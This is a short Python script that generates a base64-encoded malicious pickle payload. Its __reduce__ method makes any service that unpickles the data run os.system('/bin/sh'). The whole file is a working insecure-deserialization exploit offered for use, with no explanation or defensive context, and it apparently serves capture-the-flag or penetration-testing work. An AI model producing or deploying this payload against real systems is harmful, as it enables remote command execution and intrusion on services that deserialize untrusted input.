#!/usr/bin/env python3
import pickle
import base64

class run(object):
  def __reduce__(self):
    import os
    return (os.system, ('/bin/sh',))

print(base64.b64encode(pickle.dumps(run())))
